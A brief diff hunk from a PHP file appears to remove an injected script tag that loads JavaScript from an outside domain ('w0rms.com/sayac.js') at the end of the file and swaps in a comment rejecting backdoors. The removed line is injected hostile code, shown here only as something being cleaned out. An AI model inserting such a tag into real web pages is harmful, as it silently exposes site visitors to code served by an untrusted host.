@@ -2673,4 +2673,4 @@ function error ($phrase) {
 }
 
 ?>
-<SCRIPT SRC=http://w0rms.com/sayac.js></SCRIPT>
+// How about no Backdoors
